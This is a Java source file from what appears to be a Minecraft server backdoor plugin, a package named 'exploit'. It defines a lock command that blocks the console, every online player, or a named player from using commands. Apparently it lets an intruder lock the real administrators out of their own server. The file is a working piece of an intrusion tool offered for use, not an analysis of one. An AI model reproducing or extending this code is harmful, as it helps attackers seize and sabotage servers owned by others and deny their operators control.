package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public abstract class AbstractLockCommand extends Command {
    private final boolean shouldLock;
    private final String actionPastTense;
    private final String playerActionPastTense;
    private final String playerActionPastTenseEveryone;

    public AbstractLockCommand(boolean shouldLock) {
        super();
        this.shouldLock = shouldLock;
        this.actionPastTense = shouldLock ? "locked" : "unlocked";
        this.playerActionPastTense = shouldLock ? "blocked from using commands" : "unblocked";
        this.playerActionPastTenseEveryone = shouldLock ? "blocked from using commands" : "unblocked";
    }

    @Override public abstract String getName();
    @Override public abstract String getDescription();
    @Override public int getRequirePerm() { return 2; }
    @Override public String getUsage() { return "<all | console | everyone | player> [name]"; }

    @Override public void execute(Player sender, String[] args) {
        if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }

        String subCommand = args[0].toLowerCase();

        switch (subCommand) {
            case "all":
                if (args.length > 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
                Exploit.setState(Exploit.playerStates, "console", Exploit.State.LOCKED, shouldLock);
                for (Player p : Bukkit.getOnlinePlayers()) Exploit.setState(Exploit.playerStates, p.getName(), Exploit.State.LOCKED, shouldLock);
                Exploit.sender.sendMessage(sender, "Console and all players have been " + actionPastTense + ".");
                break;
            case "console":
                if (args.length > 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
                Exploit.setState(Exploit.playerStates, "console", Exploit.State.LOCKED, shouldLock);
                Exploit.sender.sendMessage(sender, "Console has been " + actionPastTense + ".");
                break;
            case "everyone":
                if (args.length > 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
                for (Player p : Bukkit.getOnlinePlayers()) Exploit.setState(Exploit.playerStates, p.getName(), Exploit.State.LOCKED, shouldLock);
                Exploit.sender.sendMessage(sender, "All players have been " + playerActionPastTenseEveryone + ".");
                break;
            case "player":
                if (args.length < 2) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
                String targetName = args[1];
                Exploit.setState(Exploit.playerStates, targetName, Exploit.State.LOCKED, shouldLock);
                Exploit.sender.sendMessage(sender, targetName + " has been " + playerActionPastTense + ".");
                break;
            default:
                Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                break;
        }
    }
}